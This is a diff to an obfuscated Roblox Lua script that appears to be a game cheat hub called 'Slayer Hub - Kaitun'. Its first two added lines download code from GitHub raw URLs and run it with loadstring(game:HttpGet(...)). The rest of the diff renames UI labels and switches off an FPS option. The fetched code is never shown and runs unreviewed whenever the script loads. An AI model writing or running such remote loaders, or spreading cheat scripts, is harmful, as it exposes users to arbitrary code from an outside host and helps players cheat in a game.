@@ -1,5 +1,5 @@
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duyandroid/Duyandroid/refs/heads/main/flast_ataack.lua"))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Duyandroid/Duyandroid/refs/heads/main/fast%20attcak%20vip.txt"))();
 local L_1_ = {}
 L_1_[3] = table["concat"]
 if not game:IsLoaded() then
@@ -48,7 +48,7 @@ end;
 		"Bizarre Revolver";
 		"Bazooka"
 	};
-	["FPS Booster"] = true
+	["FPS Booster"] = false
 }
 wait(5)
 if game["Players"]["LocalPlayer"]["PlayerGui"]:FindFirstChild("Main (minimal)") then
@@ -287,7 +287,7 @@ L_1_[15]["Size"] = UDim2["new"](1, -10, .5, 0)
 L_1_[15]["Position"] = UDim2["new"](.5, 0, 0, 2)
 L_1_[15]["AnchorPoint"] = Vector2["new"](.5, 0)
 L_1_[15]["BackgroundTransparency"] = 1
-L_1_[15]["Text"] = " Slayer Hub - Kaitun"
+L_1_[15]["Text"] = "Android Slayer Hub - Kaitun"
 L_1_[15]["TextColor3"] = Color3["fromRGB"](255, 0, 0)
 L_1_[15]["TextSize"] = 13
 L_1_[15]["Font"] = Enum["Font"]["GothamBold"]
@@ -325,7 +325,7 @@ L_NEW_STROKE["Parent"] = L_NEW_FRAME
 L_NEW_TEXT = Instance["new"]("TextLabel")
 L_NEW_TEXT["Size"] = UDim2["new"](1, 0, 1, 0)
 L_NEW_TEXT["BackgroundTransparency"] = 1
-L_NEW_TEXT["Text"] = " Slayer Hub"
+L_NEW_TEXT["Text"] = "Android Slayer Hub"
 L_NEW_TEXT["TextColor3"] = Color3["fromRGB"](255, 0, 0)
 L_NEW_TEXT["TextSize"] = 14
 L_NEW_TEXT["Font"] = Enum["Font"]["GothamBold"]
